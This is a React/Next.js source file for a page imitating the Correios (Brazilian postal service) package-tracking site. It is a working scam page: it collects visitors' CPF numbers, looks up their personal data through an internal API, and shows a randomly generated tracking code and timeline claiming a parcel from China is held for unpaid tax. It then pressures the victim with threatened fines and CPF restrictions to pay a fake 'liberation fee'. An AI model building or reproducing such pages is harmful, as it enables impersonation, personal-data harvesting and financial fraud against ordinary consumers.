"use client"

import type React from "react"

import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import {
  Menu,
  Volume2,
  RotateCcw,
  ShoppingCart,
  Phone,
  FileText,
  HelpCircle,
  Users,
  Building,
  GraduationCap,
  Shield,
  Search,
  Lock,
  ExternalLink,
  ChevronLeft,
  ChevronRight,
} from "lucide-react"
import { useState, useEffect, useRef } from "react"
import { useRouter } from "next/navigation"

interface CPFData {
  nome?: string
  cpf?: string
  nascimento?: string
}

export default function CorreiosPage() {
  const [currentSlide, setCurrentSlide] = useState(0)
  const [cpf, setCpf] = useState("")
  const [captchaText, setCaptchaText] = useState("")
  const [captchaInput, setCaptchaInput] = useState("")
  const [cpfError, setCpfError] = useState("")
  const [showTracking, setShowTracking] = useState(false)
  const [showPaymentModal, setShowPaymentModal] = useState(false)
  const [cpfData, setCpfData] = useState<CPFData | null>(null)
  const [isLoadingCpf, setIsLoadingCpf] = useState(false)
  const [canvasDimensions, setCanvasDimensions] = useState({ width: 400, height: 140 })
  const [isMounted, setIsMounted] = useState(false)
  const [timelineHours] = useState(() => {
    // Generate static hours once when component initializes
    return {
      hour1: Math.floor(Math.random() * 24),
      minute1: Math.floor(Math.random() * 60),
      hour2: Math.floor(Math.random() * 24),
      minute2: Math.floor(Math.random() * 60),
      hour3: Math.floor(Math.random() * 24),
      minute3: Math.floor(Math.random() * 60),
    }
  })
  const [trackingCode] = useState(() => {
    // Generate static tracking code once when component initializes
    const letters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    const numbers = "0123456789"
    let code = "BR"
    for (let i = 0; i < 9; i++) {
      code += numbers.charAt(Math.floor(Math.random() * numbers.length))
    }
    for (let i = 0; i < 2; i++) {
      code += letters.charAt(Math.floor(Math.random() * letters.length))
    }
    return code
  })
  const canvasRef = useRef<HTMLCanvasElement>(null)
  const router = useRouter()

  const validateCPF = (cpf: string) => {
    const cleanCPF = cpf.replace(/\D/g, "")

    if (cleanCPF.length !== 11) return false

    if (/^(\d)\1{10}$/.test(cleanCPF)) return false

    let sum = 0
    for (let i = 0; i < 9; i++) {
      sum += Number.parseInt(cleanCPF.charAt(i)) * (10 - i)
    }
    let remainder = (sum * 10) % 11
    if (remainder === 10 || remainder === 11) remainder = 0
    if (remainder !== Number.parseInt(cleanCPF.charAt(9))) return false

    sum = 0
    for (let i = 0; i < 10; i++) {
      sum += Number.parseInt(cleanCPF.charAt(i)) * (11 - i)
    }
    remainder = (sum * 10) % 11
    if (remainder === 10 || remainder === 11) remainder = 0
    if (remainder !== Number.parseInt(cleanCPF.charAt(10))) return false

    return true
  }

  const formatCPF = (value: string) => {
    const cleanValue = value.replace(/\D/g, "")
    return cleanValue
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .replace(/(-\d{2})\d+?$/, "$1")
  }

  const generateCaptcha = () => {
    const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghjkmnpqrstuvwxyz23456789"
    let result = ""
    for (let i = 0; i < 6; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    setCaptchaText(result)

    // Draw CAPTCHA on canvas after state update
    setTimeout(() => drawCaptcha(result), 0)
  }

  const drawCaptcha = (text: string) => {
    const canvas = canvasRef.current
    if (!canvas) return

    const ctx = canvas.getContext("2d")
    if (!ctx) return

    // Clear canvas
    ctx.clearRect(0, 0, canvas.width, canvas.height)

    const isMobile = canvasDimensions.width < 400
    canvas.width = canvasDimensions.width
    canvas.height = canvasDimensions.height

    // Background with noise
    ctx.fillStyle = "#f8f8f8"
    ctx.fillRect(0, 0, canvas.width, canvas.height)

    // Add background noise dots
    const noiseCount = isMobile ? 150 : 250
    for (let i = 0; i < noiseCount; i++) {
      ctx.fillStyle = `rgba(${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100}, 0.3)`
      ctx.fillRect(Math.random() * canvas.width, Math.random() * canvas.height, 2, 2)
    }

    // Draw interference lines
    const lineCount = isMobile ? 8 : 12
    for (let i = 0; i < lineCount; i++) {
      ctx.strokeStyle = `rgba(${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100}, 0.5)`
      ctx.lineWidth = Math.random() * 3 + 1
      ctx.beginPath()
      ctx.moveTo(Math.random() * canvas.width, Math.random() * canvas.height)
      ctx.lineTo(Math.random() * canvas.width, Math.random() * canvas.height)
      ctx.stroke()
    }

    const fontSize = isMobile ? 32 : 48
    ctx.font = `bold ${fontSize}px Arial`
    ctx.textBaseline = "middle"

    const letterSpacing = isMobile ? 42 : 60
    const startX = isMobile ? 20 : 30

    for (let i = 0; i < text.length; i++) {
      const letter = text[i]
      const x = startX + i * letterSpacing
      const y = canvas.height / 2 + (Math.random() - 0.5) * 20

      ctx.save()

      // Random rotation for each letter
      const rotation = (Math.random() - 0.5) * 0.6
      ctx.translate(x, y)
      ctx.rotate(rotation)

      // Random color for each letter
      ctx.fillStyle = `rgb(${Math.random() * 100}, ${Math.random() * 100}, ${Math.random() * 100})`

      // Draw letter with slight offset for shadow effect
      ctx.fillText(letter, 2, 2)
      ctx.fillStyle = `rgb(${Math.random() * 50}, ${Math.random() * 50}, ${Math.random() * 50})`
      ctx.fillText(letter, 0, 0)

      ctx.restore()
    }

    // Add more interference lines on top
    const topLineCount = isMobile ? 6 : 10
    for (let i = 0; i < topLineCount; i++) {
      ctx.strokeStyle = `rgba(${Math.random() * 150}, ${Math.random() * 150}, ${Math.random() * 150}, 0.4)`
      ctx.lineWidth = Math.random() * 2 + 0.5
      ctx.beginPath()
      ctx.moveTo(0, Math.random() * canvas.height)
      ctx.lineTo(canvas.width, Math.random() * canvas.height)
      ctx.stroke()
    }
  }

  useEffect(() => {
    setIsMounted(true)

    const updateDimensions = () => {
      if (typeof window !== "undefined") {
        const isMobile = window.innerWidth < 768
        setCanvasDimensions({
          width: isMobile ? 280 : 400,
          height: isMobile ? 100 : 140,
        })
      }
    }

    updateDimensions()
    window.addEventListener("resize", updateDimensions)

    return () => {
      window.removeEventListener("resize", updateDimensions)
    }
  }, [])

  useEffect(() => {
    if (isMounted) {
      generateCaptcha()
    }
  }, [isMounted])

  const handleCpfChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCPF(e.target.value)
    setCpf(formattedValue)

    if (formattedValue.length === 14) {
      if (validateCPF(formattedValue)) {
        setCpfError("")
      } else {
        setCpfError("CPF inválido")
      }
    } else {
      setCpfError("")
    }
  }

  const handleSubmit = async () => {
    if (!validateCPF(cpf)) {
      setCpfError("Por favor, digite um CPF válido")
      return
    }

    if (captchaInput.toLowerCase() !== captchaText.toLowerCase()) {
      alert("Código de verificação incorreto")
      return
    }

    const cleanCPF = cpf.replace(/\D/g, "")

    setIsLoadingCpf(true)
    console.log("[v0] Calling CPF API for:", cleanCPF)

    try {
      const apiUrl = `/api/cpf?cpf=${cleanCPF}`
      console.log("[v0] API URL:", apiUrl)

      const response = await fetch(apiUrl)
      console.log("[v0] API Response status:", response.status)

      if (response.ok) {
        const data = await response.json()
        console.log("[v0] API Response data:", data)
        setCpfData(data)

        // Store in localStorage for payment page
        localStorage.setItem("cpfData", JSON.stringify(data))
        console.log("[v0] CPF data stored in localStorage")
      } else {
        console.log("[v0] API call failed with status:", response.status)
        // Continue even if API fails
        setCpfData({ cpf: cleanCPF })
        localStorage.setItem("cpfData", JSON.stringify({ cpf: cleanCPF }))
      }
    } catch (error) {
      console.error("[v0] Error calling CPF API:", error)
      // Continue even if API fails
      setCpfData({ cpf: cleanCPF })
      localStorage.setItem("cpfData", JSON.stringify({ cpf: cleanCPF }))
    } finally {
      setIsLoadingCpf(false)
    }

    const url = new URL(window.location.href)
    url.searchParams.set("cpf", cleanCPF)
    window.history.pushState({}, "", url.toString())

    console.log("[v0] CPF validated and stored:", cleanCPF)
    setShowTracking(true)
  }

  const banners = [
    {
      src: "/images/air-fryer-banner.jpeg",
      alt: "A sua cozinha merece a Air Fryer perfeita - 30% OFF semana do CLIENTE",
    },
    {
      src: "/images/pre-pago-banner.png",
      alt: "PRÉ-PAGO - 26GB por só R$ 1,00 - Conexão de verdade, em todas as fases da vida",
    },
    {
      src: "/images/superapp-banner.png",
      alt: "Sua nova experiência Correios está aqui - SuperApp",
    },
  ]

  const nextSlide = () => {
    setCurrentSlide((prev) => (prev + 1) % banners.length)
  }

  const prevSlide = () => {
    setCurrentSlide((prev) => (prev - 1 + banners.length) % banners.length)
  }

  const handlePaymentClick = () => {
    console.log("[v0] Payment button clicked, navigating to /pagamento")
    router.push("/pagamento")
  }

  return (
    <div className="min-h-screen bg-gray-100">
      {/* Header */}
      <header style={{ backgroundColor: "#f5f3f0" }}>
        {/* Top section with accessibility and login */}
        <div className="flex items-center justify-between px-4 py-2">
          <div className="flex items-center gap-4">
            <button className="text-blue-600 text-sm">Acessibilidade ▼</button>
          </div>
        </div>

        <div className="h-px bg-white w-full"></div>

        {/* Main header section with logo and login button */}
        <div className="flex items-center justify-between px-4 py-3">
          {/* Mobile layout: hamburger left, logo center */}
          <div className="md:hidden flex items-center justify-between w-full">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
            <div className="w-6"></div> {/* Spacer for centering */}
          </div>

          {/* Desktop layout: hamburger and logo left, login right */}
          <div className="hidden md:flex items-center gap-4 flex-1">
            <Menu className="w-6 h-6 text-chart-3" />
            <img src="/images/correios-logo.png" alt="Correios" className="h-7" />
          </div>

          <div className="hidden md:flex items-center gap-2">
            <div className="bg-gray-300 mr-3 w-px h-[30px]"></div>
            <img src="/images/login-icon.png" alt="Entrar" className="h-8 w-[41px]" />
            <span className="text-[rgba(0,63,253,1)] font-light">Entrar</span>
          </div>
        </div>

        <div className="bg-yellow-400 w-full h-px"></div>
      </header>

      {/* Main Content */}
      <main className="max-w-4xl mx-auto px-4 py-6">
        {/* Breadcrumb */}
        <nav className="flex items-center gap-2 mb-4 tracking-normal text-base">
          <span className="md:hidden">
            <span className="text-blue-600">{"<"}</span>
            <span className="text-black ml-1">Rastreamento</span>
          </span>
          <div className="hidden md:flex items-center gap-2 text-blue-600">
            <span>Portal Correios</span>
            <span className="text-foreground">›</span>
            <span>Rastreamento</span>
            <span className="text-foreground">›</span>
          </div>
        </nav>

        {/* Page Title */}
        <h1 className="text-2xl font-bold mb-6 text-[rgba(0,64,105,1)]">Rastreamento</h1>

        {/* Tracking Form */}
        <div className="p-6 mb-2 rounded-sm bg-[rgba(233,236,239,1)]">
          <div className="mb-4">
            <p className="mb-2 text-[rgba(0,0,0,1)]">Deseja acompanhar seu objeto?</p>
            <p className="mb-4 text-[rgba(0,0,0,1)] pb-0 pt-0 mt-[-12px]">Digite seu CPF para consultar seus dados.</p>

            <Input
              placeholder="000.000.000-00"
              className={`w-full mb-2 bg-white rounded-sm mt-[-15px] py-[21px] ${cpfError ? "border-red-500" : ""}`}
              value={cpf}
              onChange={handleCpfChange}
              maxLength={14}
            />
            {cpfError && <p className="text-red-500 text-sm mb-2">{cpfError}</p>}
            <p className="text-sm text-[rgba(0,0,0,1)] mt-[-2px]">* Digite um CPF válido</p>
          </div>

          {/* CAPTCHA Section */}
          <div className="flex flex-col md:flex-row gap-4 items-start">
            <div className="flex-1">
              <div className="bg-white p-2 rounded border flex items-center justify-center relative mb-0 py-1.5">
                <canvas
                  ref={canvasRef}
                  className="border-0 py-0 px-0 my-0"
                  style={{
                    width: `${canvasDimensions.width}px`,
                    height: `${canvasDimensions.height}px`,
                  }}
                />
                <div className="absolute right-2 top-2 flex gap-1">
                  <button className="text-blue-600 hover:text-blue-800">
                    <Volume2 className="w-4 h-4" />
                  </button>
                  <button className="text-blue-600 hover:text-blue-800" onClick={generateCaptcha}>
                    <RotateCcw className="w-4 h-4" />
                  </button>
                </div>
              </div>
            </div>

            <div className="flex-1">
              <p className="mb-2 text-[rgba(0,0,0,1)] text-base md:text-left text-left">
                Digite o texto contido na imagem
              </p>
              <Input
                className="w-full mb-4 bg-white rounded-sm pr-[212px] pb-0 pt-0 h-10"
                value={captchaInput}
                onChange={(e) => setCaptchaInput(e.target.value)}
                placeholder="Digite o código"
              />
              <div className="flex justify-center md:justify-center">
                <Button
                  className="hover:bg-blue-700 text-white my-0 py-[19px] px-[26px] bg-[rgba(0,113,173,1)]"
                  onClick={handleSubmit}
                  disabled={isLoadingCpf}
                >
                  {isLoadingCpf ? "Consultando..." : "Consultar"}
                </Button>
              </div>
            </div>
          </div>
        </div>

        {/* Tracking Data Section */}
        {showTracking && (
          <div className="bg-white p-6 mb-2 rounded-sm border animate-in fade-in duration-700 slide-in-from-top-4">
            <div className="mb-6 p-4 bg-red-50 border border-red-200 rounded-sm">
              <h2 className="font-bold text-lg mb-3 text-red-600" style={{ fontFamily: "Verdana, sans-serif" }}>
                ENCOMENDA RETIDA EM SEU CPF!
              </h2>
              <div className="space-y-2 text-sm" style={{ fontFamily: "Verdana, sans-serif", color: "#003157" }}>
                <p>
                  <strong>Situação Atual:</strong> Aguardando Pagamento
                </p>
<p>
                  <strong>Seu Código Postal é:</strong> {trackingCode}
                </p>
                <p className="text-sm italic">
                  *ATENÇÃO: Este Código Postal está disponível apenas aqui na plataforma de fiscalização integrada e não
                  constará no Sistema dos Rastreios que não passaram por fiscalização.
                </p>
                <p>
                  A entrega encontra-se temporariamente bloqueada por pendência financeira do imposto obrigatório da
                  Receita Federal sobre sua encomenda. Para prosseguir com o envio, é necessário quitar a taxa de
                  liberação.
                </p>
                <p className="font-semibold text-red-600">
                  Caso não haja pagamento imediato, o objeto poderá ser devolvido ao remetente.
                </p>
              </div>
            </div>

            <h2 className="text-xl font-bold mb-6 text-[rgba(0,64,105,1)]">Objeto Retido</h2>
            <div className="relative">
              {/* Vertical line */}
              <div className="absolute left-6 top-0 bottom-0 w-1 bg-yellow-400"></div>

              {(() => {
                const now = new Date()
                const oneMonthAgo = new Date(now.getTime() - 30 * 24 * 60 * 60 * 1000)

                const oneWeekAfterPosting = new Date(oneMonthAgo.getTime() + 7 * 24 * 60 * 60 * 1000)
                oneWeekAfterPosting.setHours(timelineHours.hour1, timelineHours.minute1)

                const oneDayAfterArrival = new Date(oneWeekAfterPosting.getTime() + 1 * 24 * 60 * 60 * 1000)
                oneDayAfterArrival.setHours(timelineHours.hour2, timelineHours.minute2)

                const postingDate = new Date(oneMonthAgo)
                postingDate.setHours(timelineHours.hour3, timelineHours.minute3)

                const trackingData = [
                  {
                    status: "Objeto aguardando pagamento",
                    location: "CURITIBA - PR",
                    date: now.toLocaleDateString("pt-BR", { day: "2-digit", month: "2-digit", year: "numeric" }),
                    time: now.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }),
                    iconSrc: "/images/icon-pagamento.png",
                  },
                  {
                    status: "Encaminhado para fiscalização aduaneira",
                    location: "CURITIBA - PR",
                    date: oneDayAfterArrival.toLocaleDateString("pt-BR", {
                      day: "2-digit",
                      month: "2-digit",
                      year: "numeric",
                    }),
                    time: oneDayAfterArrival.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }),
                    iconSrc: "/images/icon-caminhao.png",
                  },
                  {
                    status: "Objeto recebido pelos Correios do Brasil",
                    location: "CURITIBA - PR",
                    date: oneWeekAfterPosting.toLocaleDateString("pt-BR", {
                      day: "2-digit",
                      month: "2-digit",
                      year: "numeric",
                    }),
                    time: oneWeekAfterPosting.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }),
                    iconSrc: "/images/icon-brasil.png",
                  },
                  {
                    status: "Objeto postado",
                    location: "CHINA",
                    date: postingDate.toLocaleDateString("pt-BR", {
                      day: "2-digit",
                      month: "2-digit",
                      year: "numeric",
                    }),
                    time: postingDate.toLocaleTimeString("pt-BR", { hour: "2-digit", minute: "2-digit" }),
                    iconSrc: "/images/icon-postado.png",
                  },
                ]

                return trackingData.map((item, index) => (
                  <div
                    key={index}
                    className="relative flex items-start mb-8 last:mb-0 animate-in fade-in slide-in-from-left-4 duration-500"
                    style={{ animationDelay: `${index * 150}ms` }}
                  >
                    <div
                      className="relative z-10 flex items-center justify-center w-12 h-12 rounded-full p-2"
                      style={{ backgroundColor: "#efedea" }}
                    >
                      <img
                        src={item.iconSrc || "/placeholder.svg"}
                        alt={item.status}
                        className="w-8 h-8 object-contain"
                      />
                    </div>

                    {/* Content */}
                    <div className="ml-6 flex-1">
                      <h3
                        className="font-semibold text-sm mb-1"
                        style={{ fontFamily: "Verdana, sans-serif", color: "#003157" }}
                      >
                        {item.status}
                      </h3>
                      <p
                        className="text-sm font-medium"
                        style={{ fontFamily: "Verdana, sans-serif", color: "#003157" }}
                      >
                        {item.location}
                      </p>
                      <p className="text-xs" style={{ fontFamily: "Verdana, sans-serif", color: "#003157" }}>
                        {item.date} {item.time}
                      </p>

                      {item.status === "Objeto aguardando pagamento" && (
                        <div className="mt-2">
                          <p className="text-xs mb-1" style={{ fontFamily: "Verdana, sans-serif", color: "#003157" }}>
                            Realize o pagamento:
                            <button
                              onClick={handlePaymentClick}
                              className="text-blue-600 hover:text-blue-800 underline ml-1"
                              style={{ fontFamily: "Verdana, sans-serif" }}
                            >
                              Efetuar pagamento
                            </button>
                          </p>
                        </div>
                      )}
                    </div>
                  </div>
                ))
              })()}
            </div>

            {/* Buttons at the end of timeline container, centered */}
            <div className="flex justify-center gap-3 mt-6">
              <Button
                className="bg-blue-600 hover:bg-blue-700 text-white px-6 py-2 text-sm"
                onClick={handlePaymentClick}
              >
                Efetuar pagamento
              </Button>
              <Button
                variant="outline"
                className="border-blue-600 text-blue-600 hover:bg-blue-50 px-6 py-2 text-sm bg-transparent"
                onClick={() => {
                  const cleanCPF = cpf.replace(/\D/g, "")
                  router.push(`/atendimento?cpf=${cleanCPF}`)
                }}
              >
                Falar com atendente
              </Button>
            </div>
          </div>
        )}

        {/* Payment Modal */}
        {showPaymentModal && (
          <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
            <div className="bg-white rounded-lg max-w-2xl w-full max-h-[90vh] overflow-y-auto">
              <div className="p-6">
                {/* Header */}
                <div className="flex justify-between items-center mb-6">
                  <h2 className="text-2xl font-bold text-gray-900" style={{ fontFamily: "Verdana, sans-serif" }}>
                    Imposto de Taxação de Produto (ICMS)
                  </h2>
                  <button
                    onClick={() => setShowPaymentModal(false)}
                    className="text-gray-500 hover:text-gray-700 text-2xl"
                  >
                    ×
                  </button>
                </div>

                {/* Alert Box */}
                <div className="bg-red-50 border border-red-200 rounded-lg p-4 mb-6">
                  <p className="text-red-700" style={{ fontFamily: "Verdana, sans-serif" }}>
                    <strong>Sujeito a multa de R$ 1.872,91.</strong>
                  </p>
                  <p className="text-red-700" style={{ fontFamily: "Verdana, sans-serif" }}>
                    É necessário realizar o pagamento da taxa para seu produto ser liberado.
                  </p>
                </div>

                {/* Warning Text */}
                <div className="mb-6 text-sm" style={{ fontFamily: "Verdana, sans-serif", color: "#333" }}>
                  <p className="mb-2">
                    Não, sua mercadoria foi retida por falta de nota fiscal. O não pagamento imediato do imposto de{" "}
                    <strong>R$ 62,70</strong> resultará em multa de 75% do valor do produto, além de possíveis
                    restrições no CPF.
                  </p>
                  <p className="text-sm text-gray-600">(Lei nº 8.846/1994)</p>
                </div>

                {/* Payment Guide */}
                <div className="bg-gray-50 rounded-lg p-4 mb-6">
                  <h3 className="font-bold text-lg mb-4" style={{ fontFamily: "Verdana, sans-serif" }}>
                    Guia de Pagamento
                  </h3>

                  <div className="space-y-3 text-sm" style={{ fontFamily: "Verdana, sans-serif" }}>
                    <div className="flex justify-between">
                      <span className="text-gray-700">Nome completo:</span>
                      <span className="text-gray-500">Não informado</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-700">CPF:</span>
                      <span className="text-gray-500">Não informado</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-700">Data de nascimento:</span>
                      <span className="text-gray-500">Não informado</span>
                    </div>

                    <hr className="my-3" />

                    <div className="flex justify-between">
                      <span className="text-gray-700">Taxa de Importação</span>
                      <span className="font-medium">R$ 65,00</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-700">Desembaraço Aduaneiro</span>
                      <span className="font-medium">R$ 20,00</span>
                    </div>
                    <div className="flex justify-between">
                      <span className="text-gray-700">Encargos Operacionais</span>
                      <span className="font-medium">R$ 15,48</span>
                    </div>

                    <div className="flex justify-between text-gray-500">
                      <span className="line-through">Subtotal</span>
                      <span className="line-through">R$ 100,48</span>
                    </div>

                    <div className="flex justify-between text-green-600">
                      <span>Desconto por Antecipação</span>
                      <span>-R$ 37,78</span>
                    </div>

                    <hr className="my-3" />

                    <div className="flex justify-between text-lg font-bold">
                      <span>Total a Pagar</span>
                      <span>R$ 62,70</span>
                    </div>
                  </div>
                </div>

                {/* Terms Checkbox */}
                <div className="flex items-start gap-3 mb-6">
                  <input type="checkbox" className="mt-1 w-4 h-4 text-blue-600" />
                  <p className="text-sm text-gray-600" style={{ fontFamily: "Verdana, sans-serif" }}>
                    Concordo com os termos, ciente de que a falta de pagamento pode acarretar multas e restrições no
                    CPF, optando pela regularização e liberação da mercadoria.
                  </p>
                </div>

                {/* Payment Button */}
                <button
                  className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-6 rounded-lg text-lg"
                  style={{ fontFamily: "Verdana, sans-serif" }}
                  onClick={() => {
                    setShowPaymentModal(false)
                    handlePaymentClick()
                  }}
                >
                  LIBERAR MERCADORIA
                </button>
              </div>
            </div>
          </div>
        )}

        {/* Banner Section */}
        <div className="relative mb-2">
          <div className="overflow-hidden rounded-lg">
            <div
              className="flex transition-transform duration-300 ease-in-out"
              style={{ transform: `translateX(-${currentSlide * 100}%)` }}
            >
              {banners.map((banner, index) => (
                <div key={index} className="w-full flex-shrink-0">
                  <img
                    src={banner.src || "/placeholder.svg"}
                    alt={banner.alt}
                    className="w-full h-auto mt-0 pb-0 pt-0"
                  />
                </div>
              ))}
            </div>
          </div>

          {/* Navigation arrows */}
          <button
            onClick={prevSlide}
            className="absolute left-4 top-1/2 -translate-y-1/2 hover:bg-white rounded-full p-2 shadow-lg transition-colors bg-[rgba(255,255,255,0)] mr-0 ml-[-15px]"
          >
            <ChevronLeft className="w-6 h-6 text-gray-700" />
          </button>

          <button
            onClick={nextSlide}
            className="absolute right-4 top-1/2 -translate-y-1/2 hover:bg-white rounded-full p-2 shadow-lg transition-colors bg-[rgba(255,255,255,0)] mr-[-16px]"
          >
            <ChevronRight className="w-6 h-6 text-gray-700" />
          </button>

          {/* Dots indicator */}
          <div className="flex justify-center mt-4 gap-2">
            {banners.map((_, index) => (
              <button
                key={index}
                onClick={() => setCurrentSlide(index)}
                className={`w-3 h-3 rounded-full transition-colors ${
                  currentSlide === index ? "bg-blue-600" : "bg-gray-300"
                }`}
              />
            ))}
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="bg-yellow-400 text-black py-8 mt-12">
        <div className="max-w-6xl mx-auto px-4">
          <div className="grid grid-cols-1 md:grid-cols-3 gap-8">
            {/* Fale Conosco */}
            <div>
              <h3 className="font-bold mb-4 text-[rgba(0,64,105,1)] text-lg md:text-2xl">Fale Conosco</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(12,63,101,1)]" />
                  <span className="text-[rgba(0,65,104,1)] font-medium text-sm md:text-base">
                    Registro de Manifestações
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Phone className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Central de Atendimento
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <ShoppingCart className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Soluções para o seu negócio
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <HelpCircle className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Suporte ao cliente com contrato
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Users className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Ouvidoria</span>
                </li>
                <li className="flex items-center gap-2">
                  <Shield className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Denúncia</span>
                </li>
              </ul>
            </div>

            {/* Sobre os Correios */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Sobre os Correios</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2">
                  <Building className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Identidade corporativa
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <GraduationCap className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Educação e cultura</span>
                </li>
                <li className="flex items-center gap-2">
                  <FileText className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">Código de ética</span>
                </li>
                <li className="flex items-center gap-2">
                  <Search className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Transparência e prestação de contas
                  </span>
                </li>
                <li className="flex items-center gap-2">
                  <Lock className="w-4 h-4 text-[rgba(0,64,105,1)]" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Política de Privacidade e Notas Legais
                  </span>
                </li>
              </ul>
            </div>

            {/* Outros Sites */}
            <div>
              <h3 className="font-bold mb-4 text-lg md:text-2xl text-[rgba(0,64,105,1)]">Outros Sites</h3>
              <ul className="space-y-2">
                <li className="flex items-center gap-2 text-[rgba(0,64,105,1)]">
                  <ExternalLink className="w-4 h-4" />
                  <span className="text-[rgba(0,64,105,1)] font-medium text-sm md:text-base">
                    Loja online dos Correios
                  </span>
                </li>
              </ul>
            </div>
          </div>

          <div className="text-center mt-8 pt-4 border-t border-yellow-500">
            <p className="text-sm">© Copyright 2025 Correios</p>
          </div>
        </div>
      </footer>
    </div>
  )
}
